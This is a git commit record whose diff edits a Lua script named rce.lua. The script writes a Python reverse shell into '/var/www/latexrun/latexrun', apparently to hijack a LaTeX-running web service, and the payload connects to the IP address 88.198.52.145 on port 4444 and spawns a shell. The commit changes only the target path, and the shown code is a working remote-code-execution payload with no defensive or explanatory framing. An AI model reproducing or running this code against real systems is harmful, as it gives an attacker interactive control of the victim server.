f04d27bfffd39a8f944dc4eede90b67043f01a6e
Aaron Dewes <aaron@runcitadel.space>
2025-04-29 22:40:59 +0200

    Update rce.lua

--- rce.lua
+++ rce.lua
@@ -1,4 +1,4 @@
-local file = io.open("/var/www/latexrun", "w")
+local file = io.open("/var/www/latexrun/latexrun", "w")
 if file then
     file:write("#!/usr/bin/env python\n")
     file:write("import os,pty,socket;s=socket.socket();s.connect((\"88.198.52.145\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")\n")
